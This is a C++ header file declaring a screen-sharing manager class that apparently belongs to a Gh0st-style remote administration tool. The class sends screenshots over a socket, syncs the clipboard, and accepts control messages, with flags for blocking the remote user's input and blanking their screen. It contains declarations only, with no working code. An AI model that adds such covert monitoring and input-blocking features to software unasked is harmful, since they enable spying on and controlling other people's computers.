#pragma once
#define ZLIB_WINAPI
#include "Manager.h"
#include "ScreenSpy.h"
#include "zlib.h"

#ifdef _WIN64

#ifdef _DEBUG
#pragma comment(lib, "delib_64.lib")
#else
#pragma comment(lib, "relib_64.lib")
#endif


#else

#ifdef _DEBUG
#pragma comment(lib, "delib.lib")
#else
#pragma comment(lib, "relib.lib")
#endif

#endif

struct MYtagMSG { //自定义控制消息


	UINT        lParam;
	UINT        message;
	long long      wParam;
	int x;
	int y;
};
class CScreenQuickManager : public CManager
{
public:
	BOOL m_buser;
	CScreenQuickManager(ISocketBase* pClient);
	virtual ~CScreenQuickManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
	void sendBITMAPINFO();
	void sendsize();
	void sendFirstScreen();
	void sendNextScreen();
	bool IsMetricsChange();
	bool IsConnect();
	int	GetCurrentPixelBits();

	bool m_bIsWorking;
	bool m_bIsBlockInput;
	bool m_bIsBlankScreen;
	long m_oldwidth, m_oldheigh;
private:
	BYTE	m_bAlgorithm;
	bool	m_bIsCaptureLayer;
	int	m_biBitCount;
	int	m_fps;
	HANDLE	m_hWorkThread, m_hBlankThread;
	CCursorInfo	m_CursorInfo;
	CScreenSpy* m_pScreenSpy;
	HDC		m_hDeskTopDC;
	void ResetScreen(int biBitCount = 32);
	void ProcessCommand(LPBYTE lpBuffer, UINT nSize);
	static unsigned __stdcall WorkThread(LPVOID lparam);
	static unsigned __stdcall	ControlThread(LPVOID lparam);
	void UpdateLocalClipboard(char* buf, int len);
	void SendLocalClipboard();
	MYtagMSG* m_MYtagMSG;
	int m_MYtagMSGsize;

};

